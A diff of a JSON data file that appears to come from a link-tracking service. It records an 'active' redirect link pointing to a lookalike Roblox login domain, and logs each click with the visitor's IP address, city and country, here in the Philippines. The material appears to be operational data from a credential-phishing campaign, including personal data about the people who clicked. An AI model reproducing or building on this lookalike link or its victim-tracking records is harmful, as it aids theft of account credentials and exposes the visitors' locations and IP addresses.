@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1452,
+    "useCount": 1453,
     "createdBy": "admin",
     "clicks": [
       {
@@ -11782,6 +11782,14 @@
         "ip": "112.198.207.173",
         "country": "Philippines",
         "city": "Nasugbu",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777434835901,
+        "ip": "49.145.218.45",
+        "country": "Philippines",
+        "city": "Davao City",
         "flag": "🇵🇭",
         "countryCode": "PH"
       }
